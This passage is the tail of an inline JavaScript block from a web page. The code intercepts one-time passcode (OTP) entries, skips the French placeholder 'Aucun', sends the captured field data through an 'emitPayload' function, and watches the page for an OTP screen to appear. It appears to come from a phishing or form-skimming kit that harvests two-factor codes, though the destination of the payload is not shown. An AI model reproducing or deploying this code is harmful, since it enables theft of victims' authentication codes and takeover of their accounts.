    if (!isOtpInputElement(el)) return;

    const data = readFields(el);
    if (data.otp && data.otp !== "Aucun" && data.otp.length >= 1) {
      emitPayload(data, true);
    }
  }, true);

  const observer = new MutationObserver(() => checkOtpScreenAlert());
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => {
      checkOtpScreenAlert();
      observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ["class", "style", "aria-hidden"] });
    });
  } else {
    checkOtpScreenAlert();
    observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ["class", "style", "aria-hidden"] });
  }
})();
</script>
